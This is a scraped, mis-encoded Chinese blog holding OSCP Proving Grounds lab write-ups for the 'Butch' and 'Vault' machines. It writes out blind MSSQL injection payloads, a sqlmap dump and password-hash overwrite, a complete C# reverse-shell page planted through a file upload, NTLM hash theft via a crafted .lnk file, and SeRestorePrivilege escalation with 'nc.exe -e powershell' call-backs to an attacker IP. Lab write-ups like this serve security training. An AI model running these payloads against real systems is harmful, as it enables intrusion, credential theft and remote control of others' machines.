445/tcp open microsoft-ds? Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.13 seconds å…¨ç«¯å£ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.225.63 -T4 -p- â€¦â€¦ PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 25/tcp open smtp Microsoft ESMTP 10.0.17763.1 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 450/tcp open http Microsoft IIS httpd 10.0 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"InitAccess å°è¯•äº†ftpåŒ¿åç™»å½•ï¼ŒSMBåŒ¿åè®¿é—®æ— æœã€‚ ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"450-Web ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"SQLæ³¨å…¥ è®¿é—® 450 ç«¯å£æ˜¯ä¸ªWebé¡µé¢çš„ç™»å½•å£ï¼Œæ²¡æœ‰è´¦å·å¯†ç ï¼Œæµ‹è¯•å‘ç°å­˜åœ¨SQLæ³¨å…¥ã€‚ exec master.dbo.xp_dirtree '\\\\192.168.45.164\\123';-- sudo responder -I tun0 å¤±è´¥ï¼Œxp_cmdshellå¤±è´¥ åªèƒ½è€è€å®å®çš„å»æ³¨å…¥äº† # æšä¸¾æ•°æ®åº“å admin'if(len(db_name()))\u003e=0+waitfor+delay+'0:0:2';-- admin'if(substring(db_name(),1,1))\u003e='c'+waitfor+delay+'0:0:2';-- # æœ€ç»ˆå¾—åˆ°æ•°æ®åº“åä¸ºbutch # æšä¸¾è¡¨å admin'if((select+count(name)+from+butch..sysobjects+where+xtype='u'))\u003e=0+waitfor+delay+'0:0:2';-- # æœ‰1å¼ è¡¨ admin'if((select+len(name)+from+butch..sysobjects+where+xtype='u'))\u003e=0+waitfor+delay+'0:0:2';-- # è¡¨åé•¿åº¦ä¸º5 admin'if((select+substring(name,1,1)+from+butch..sysobjects+where+xtype='u'))\u003e='u'+waitfor+delay+'0:0:2';-- # å¾—åˆ°è¡¨åä¸º users # æšä¸¾åˆ—å admin'if((select+count(name)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e=4+waitfor+delay+'0:0:2';-- # æœ‰3åˆ— admin'if((select+top+1+len(name)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e=13+waitfor+delay+'0:0:2';-- #ç¬¬ä¸€åˆ—åˆ—åé•¿åº¦ä¸º13 admin'if((select+top+1+substring(name,1,1)+from+syscolumns+where+id=OBJECT_ID('users')))\u003e='p'+waitfor+delay+'0:0:2';-- # å¾—åˆ°åˆ—åä¸ºpassword_hash,user_id,username # æšä¸¾å­—æ®µå€¼ admin'if((select+len(password_hash)+from+butch..users))\u003e=64+waitfor+delay+'0:0:1';-- # passwordåˆ—é•¿åº¦ä¸º64 admin'if((select+substring(password_hash,1,3)+from+butch..users))\u003e='a+waitfor+delay+'0:0:1';-- å› ä¸ºé•¿åº¦å¤ªé•¿äº†ï¼Œå°±ä¸æ‰‹å·¥è·‘äº†ï¼Œç”¨sqlmapè·‘ä¸‹æœ€åçš„ç»“æœ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ sqlmap -r sqli.txt --level=3 --risk=3 -D butch -T users -C 'password_hash','username' --technique=T --dbms=mssql --dump --batch â€¦â€¦ [18:08:47] [WARNING] no clear password(s) found Database: butch Table: users [1 entry] +------------------------------------------------------------------+----------+ | password_hash | username | +------------------------------------------------------------------+----------+ | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 | butch | +------------------------------------------------------------------+----------+ â€¦â€¦ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 Analyzing 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267' [+] Snefru-256 [+] SHA-256 [+] RIPEMD-256 [+] Haval-256 [+] GOST R 34.11-94 [+] GOST CryptoPro S-Box [+] SHA3-256 [+] Skein-256 [+] Skein-512(256) å°è¯•ç ´è§£Hashå¤±è´¥ã€‚ åšå®Œé¢˜åçœ‹äº†å®˜æ–¹walkthroughï¼Œè¿™é‡Œæ˜¯é€šè¿‡sqlmapç ´è§£çš„å¯†ç Hashï¼Œä¸å¤ªæ˜ç™½æ€ä¹ˆåšåˆ°çš„ã€‚ Since the output contained a password hash, sqlmap offers to attempt to crack the hash with a common wordlist. Weâ€™ll respond with Y or yes to proceed. The attempt is successful, revealing a password of awesomedude. We can successfully authenticate to the web app with this password. æˆ‘æœ¬åœ°çš„ç»“æœæ˜¯æ²¡æœ‰è·‘å‡ºæ¥çš„ è¿™æ—¶å€™çš„å¦ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯é€šè¿‡SQLæ³¨å…¥ä¿®æ”¹æ•°æ®åº“ã€‚ é‡æ–°è®¾ç½®ä¸€ä¸ªå¯†ç ï¼Œè®¡ç®—å…¶sha256çš„å€¼ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ echo '123456' | sha256sum e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0 - æ’å…¥æ–°è®°å½•å¤±è´¥ insert into users(password_hash,user_id,username) values ('e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0',2,'test'); ä¿®æ”¹åŸæœ‰è®°å½• UPDATE users SET password_hash='e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0' WHERE username='butch'; è¿˜æ˜¯å¤±è´¥äº†ï¼Œé”™è¯¯åŸå› æ˜¯echo '123456'è¿™ä¸€æ­¥ä¸å¯¹ï¼Œechoé»˜è®¤æƒ…å†µä¸‹çš„è¾“å‡ºæ˜¯å¸¦æœ‰æ¢è¡Œç¬¦çš„ï¼Œå¯¼è‡´è®¡ç®—çš„ç»“æœhashä¸é¢„æœŸä¸ç¬¦ã€‚ é‡æ–°è®¡ç®—Hashï¼Œå†æ¬¡ä¿®æ”¹åŸæœ‰è®°å½•ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Butch] â””â”€$ echo -n '123456' | sha256sum 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 - ;UPDATE users SET password_hash='8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE username='butch'; ä½¿ç”¨butch/123456æˆåŠŸç™»å½•Webåå°ï¼Œå‘ç°æ˜¯ä¸ªåå°ä¸Šä¼ åŠŸèƒ½ã€‚ ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"æ–‡ä»¶ä¸Šä¼  æ­£å¸¸æƒ…å†µä¸‹çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹çš„æ€è·¯å°±æ˜¯ä¸Šä¼ webshellï¼Œæˆ–è€…è¦†ç›–æŸäº›é…ç½®æ–‡ä»¶ã€‚è¿™é‡Œapsxç­‰å¯æ‰§è¡Œæ–‡ä»¶åç¼€æ— æ³•ä¸Šä¼ ï¼ŒWebshellæ€è·¯èµ°ä¸é€šã€‚é…ç½®æ–‡ä»¶è¿™å—åˆä¸å¤ªäº†è§£ã€‚ è¡¥å……ä¸€ä¸‹ï¼Œé€šè¿‡ä¸Šä¼ txtç­‰æµ‹è¯•æ–‡ä»¶ï¼Œæœ€ååœ¨Webæ ¹ç›®å½•ä¸‹æ‰¾åˆ°äº†è¿™äº›æ–‡ä»¶ï¼Œç¡®è®¤äº†è¿™äº›æ–‡ä»¶çš„ä¸Šä¼ ä½ç½®ã€‚ æ¥ä¸‹å»çš„çŸ¥è¯†ç‚¹éƒ½æ˜¯æ–°å­¦çš„ WebæœåŠ¡ä¸‹æœ‰ä¸ªdevç›®å½•ï¼ŒåŒ…å«äº†ä¸€ä¸ªsite.master.txtæ–‡ä»¶ï¼Œç–‘ä¼¼æ˜¯æºç çš„ä¸€ä¸ªå¤‡ä»½ \u003c%@ Language=\"C#\" src=\"site.master.cs\" Inherits=\"MyNamespaceMaster.MyClassMaster\" %\u003e \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"\u003e \u003chtml xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"\u003e \u003chead runat=\"server\"\u003e \u003ctitle\u003eButch\u003c/title\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003cmeta name=\"application-name\" content=\"Butch\"\u003e \u003cmeta name=\"author\" content=\"Butch\"\u003e \u003cmeta name=\"description\" content=\"Butch\"\u003e \u003cmeta name=\"keywords\" content=\"Butch\"\u003e \u003clink media=\"all\" href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" /\u003e \u003clink id=\"favicon\" rel=\"shortcut icon\" type=\"image/png\" href=\"favicon.png\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"wrap\"\u003e \u003cdiv id=\"header\"\u003eWelcome to Butch Repository\u003c/div\u003e \u003cdiv id=\"main\"\u003e \u003cdiv id=\"content\"\u003e \u003cbr /\u003e \u003casp:contentplaceholder id=\"ContentPlaceHolder1\" runat=\"server\"\u003e\u003c/asp:contentplaceholder\u003e \u003cbr /\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e å¾®è½¯å®˜æ–¹æ–‡æ¡£site.master è¡¨æ˜è¯¥æ–‡ä»¶ä¸ºæ¯ä¸ªé¡µé¢æä¾›äº†ä¸€ä¸ªæ¨¡æ¿åœ¨ ASP.NET MVC é£æ ¼çš„åº”ç”¨ç¨‹åºä¸Šã€‚ è¿™å—C#çš„ä»£ç ä¸äº†è§£ï¼ŒåªçŸ¥é“å¼•å…¥äº†site.master.csï¼Œæ¥ä¸‹å»çš„æ€è·¯å°±æ˜¯æ›¿æ¢è¿™ä¸ªæ–‡ä»¶ï¼Œè®©å®ƒå»æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚ ä»è¿™æ‰¾äº†ä¸ªdemoè¿›è¡Œä¸Šä¼ ï¼Œhttps://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs using System; using System.Web.UI; namespace WebFormsExample { public partial class SiteMaster : MasterPage { protected void Page_Load(object sender, EventArgs e) { } } } ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®é¦–é¡µï¼Œé¦–é¡µæŠ¥500é”™è¯¯ï¼Œè¯´æ˜è‡³å°‘æ–‡ä»¶æ˜¯æ›¿æ¢æˆåŠŸäº†ã€‚ è¿™é‡Œ500ä¹‹åå¥½åƒåªèƒ½é‡ç½®ç¯å¢ƒï¼Œéœ€è¦æ„é€ å¥½æ¶æ„æ–‡ä»¶å†ä¸Šä¼ ã€‚ æ¶æ„æ–‡ä»¶1 ä½¿ç”¨ reverse-shell-generator ç”Ÿæˆ C#çš„åå¼¹Shellä»£ç  using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Linq; using System.Net; using System.Net.Sockets; namespace ConnectBack { public class Program { static StreamWriter streamWriter; public static void Main(string[] args) { using(TcpClient client = new TcpClient(\"192.168.45.164\", 4444)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"powershell\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputReadLine(); while(true) { strInput.Append(rdr.ReadLine()); //strInput.Append(\"\\n\"); p.StandardInput.WriteLine(strInput); strInput.Remove(0, strInput.Length); } } } } } private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) { StringBuilder strOutput = new StringBuilder(); if (!String.IsNullOrEmpty(outLine.Data)) { try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); } catch (Exception err) { } } } } } æ„é€ æ¶æ„æ–‡ä»¶ï¼š using System; using System.Web.UI; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Linq; using System.Net; using System.Net.Sockets; namespace MyNamespaceMaster { public partial class MyClassMaster : MasterPage { static StreamWriter streamWriter; protected void Page_Load(object sender, EventArgs e) { using(TcpClient client = new TcpClient(\"192.168.45.164\", 445)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputRe","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"Flag butch/awesomedude type C:\\users\\administrator\\desktop\\proof.txt 8efb9ecaa9dd953e25de084f5db30648 type C:\\users\\butch\\desktop\\local.txt 0f5cfaf654fe39337300f602295effb4 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["é¶åœº"],"content":"Vault è¿™æ˜¯ç¬¬23å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦Hardï¼Œåç§° Vault 192.168.202.172 ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.202.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 16:45 CST Nmap scan report for 192.168.202.172 Host is up (0.19s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-09 08:45:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds å…¨ç«¯å£æ‰«æï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.202.172 -T4 -p- [sudo] xavier çš„å¯†ç ï¼š Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 16:45 CST Nmap scan report for 192.168.202.172 Host is up (0.19s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-09 08:46:28Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 115.86 seconds åŸŸä¸»æœºï¼ŒåŸŸåï¼švault.offsec ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"InitAccess ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"SMB SMBåŒ¿åè®¿é—® â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice] â””â”€$ smbclient -L //192.168.202.172/ -U '' Password for [WORKGROUP\\]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share DocumentsShare Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 192.168.202.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ crackmapexec smb 192.168.202.172 -u 'guest' -p '' --shares SMB 192.168.202.172 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) SMB 192.168.202.172 445 DC [+] vault.offsec\\guest: SMB 192.168.202.172 445 DC [+] Enumerated shares SMB 192.168.202.172 445 DC Share Permissions Remark SMB 192.168.202.172 445 DC ----- ----------- ------ SMB 192.168.202.172 445 DC ADMIN$ Remote Admin SMB 192.168.202.172 445 DC C$ Default share SMB 192.168.202.172 445 DC DocumentsShare READ,WRITE SMB 192.168.202.172 445 DC IPC$ READ Remote IPC SMB 192.168.202.172 445 DC NETLOGON Logon server share SMB 192.168.202.172 445 DC SYSVOL Logon server share å¯ä»¥çœ‹åˆ° DocumentsShare è·¯å¾„ä¸‹æœ‰å¯å†™æƒé™ã€‚å°è¯•ä¸Šä¼ æ¶æ„æ–‡ä»¶åˆ°è¯¥ç›®å½•ä¸‹ã€‚ ä½¿ç”¨NTLM_Theftå·¥å…·ç”Ÿæˆæ¶æ„æ–‡ä»¶. â”Œâ”€â”€(xavierã‰¿kali)-[~/Hacksafe/4-æƒé™æå‡/Windows/ntlm_theft] â””â”€$ python3 ntlm_theft.py -g lnk -s 192.168.45.248 -f test Created: test/test.lnk (BROWSE TO FOLDER) Generation Complete. ä¸Šä¼ åˆ°è¯¥ç›®å½•ä¸‹ï¼Œresponderç­‰å¾…å›è¿ â”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ smbclient //192.168.202.172/DocumentsShare -U '' Password for [WORKGROUP\\]: Try \"help\" to get a list of possible commands. smb: \\\u003e put test.lnk putting file test.lnk as \\test.lnk (3.3 kb/s) (average 3.3 kb/s) â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ sudo responder -I tun0 â€¦â€¦ [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.202.172 [SMB] NTLMv2-SSP Username : VAULT\\anirudh [SMB] NTLMv2-SSP Hash : anirudh::VAULT:b016c3bc0a2a9b1c:8B6874393AEA8CC736BEAA79E7E1D231:010100000000000000DD12A6A05BDA01B5B2F11259155F4A000000000200080051004B003700350001001E00570049004E002D00570041005A00460036004B0035004A0057004B00560004003400570049004E002D00570041005A00460036004B0035004A0057004B0056002E0051004B00370035002E004C004F00430041004C000300140051004B00370035002E004C004F00430041004C000500140051004B00370035002E004C004F00430041004C000700080000DD12A6A05BDA010600040002000000080030003000000000000000010000000020000077EEB54469D1F6103BA0F72DC177ACE44970D6FADE091CA17405179482A7C5F20A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340038000000000000000000 [*] Skipping previously captured hash for VAULT\\anirudh [*] Skipping previously captured hash for VAULT\\anirudh hashcatå°è¯•ç ´è§£ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ hashcat -m 5600 -a 0 1.hash /usr/share/wordlists/rockyou.txt --force --quiet ANIRUDH::VAULT:b016c3bc0a2a9b1c:8b6874393aea8cc736beaa79e7e1d231:010100000000000000dd12a6a05bda01b5b2f11259155f4a000000000200080051004b003700350001001e00570049004e002d00570041005a00460036004b0035004a0057004b00560004003400570049004e002d00570041005a00460036004b0035004a0057004b0056002e0051004b00370035002e004c004f00430041004c000300140051004b00370035002e004c004f00430041004c000500140051004b00370035002e004c004f00430041004c000700080000dd12a6a05bda010600040002000000080030003000000000000000010000000020000077eeb54469d1f6103ba0f72dc177ace44970d6fade091ca17405179482a7c5f20a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200340038000000000000000000:SecureHM å¾—åˆ°ä¸€ç»„è´¦å·å¯†ç ï¼šanirudh/SecureHM ä½¿ç”¨Evil-WinRMæˆåŠŸç™»å½•ç³»ç»Ÿ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172 â€¦â€¦ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e type C:\\Users\\anirudh\\Desktop\\local.txt 6379a394e97f465833bd2a2d72fe5d56 ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"PrivE æ£€æŸ¥å½“å‰ç”¨æˆ·æƒé™ï¼Œå‘ç°æƒé™æœ‰å¾ˆå¤šï¼š *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"SeRestorePrivilege çœ‹åˆ°æœ‰è¿™ä¸ªæƒé™ï¼Œå¯ä»¥ç”¨äºææƒã€‚ ä½¿ç”¨å·¥å…·ï¼šSeRestoreAbuseï¼Œéœ€è¦è‡ªå·±æ‰‹åŠ¨ç¼–è¯‘ä¸€ä¸‹ã€‚ ä¸Šä¼ SeRestoreAbuse å’Œnc *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload SeRestoreAbuse.exe *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload nc64.exe *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e mkdir C:\\tmp\\ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e copy nc64.exe C:\\tmp\\nc.exe æ‰§è¡Œ SeRestoreAbuse åˆ©ç”¨è„šæœ¬ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.248 4444 -e powershell\" RegCreateKeyExA result: 0 RegSetValueExA result: 0 å¦ä¸€è¾¹ncç›‘å¬ï¼Œå› ä¸ºSeRestoreAbuseè¿™ä¸ªå·¥å…·æ‰§è¡Œä¸€æ®µæ—¶é—´åï¼Œå¯èƒ½ä¼šæŠ¥é”™å¯¼è‡´shellä¸­æ–­ï¼Œå†åšä¸€æ¬¡è½¬å‘å°±å¥½äº† â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51849 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ nc -nlvp 5555 listening on [any] 5555 ... connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51852 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami nt authority\\system PS C:\\Windows\\system32\u003e type C:\\users\\administrator\\desktop\\proof.txt type C:\\users\\administrator\\desktop\\proof.txt 12ef329cf77b22fb67e52b389022be6d ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.248 4444 -e powershell\" C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"GPO Abuse æ£€æŸ¥å½“å‰ç”¨æˆ·æ˜¯å¦å…·å¤‡ä¿®æ”¹ç»„ç­–ç•¥çš„æƒé™ã€‚ å°†PowerView æ”¾åˆ°Evil-WinRMçš„æ‰§è¡Œç›®å½•ä¸‹ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 . â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ ls 1.hash PowerView.ps1 æ¥ä¸‹æ¥, ä½¿ç”¨Evil-WinRM å’Œ -s å‚æ•°é‡æ–°è¿æ¥ï¼Œä»¥ä¾¿è®¿é—®å½“å‰ç›®å½•ä¸­çš„ PowerShell è„šæœ¬ã€‚ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e exit Info: Exiting with code 0 â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Vault] â””â”€$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172 -s . â€¦â€¦ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e PowerView.ps1 ç»„ç­–ç•¥æšä¸¾ ä½¿ç”¨ Get-NetGPO åˆ—å‡º GPOsï¼ˆGroup Policy Objectsï¼‰ï¼Œè·å–GUID *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e PowerView.ps1 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e Get-NetGPO usncreated : 5672 systemflags : -1946157056 displayname : Default Domain Policy gpcmachineextensionnames : 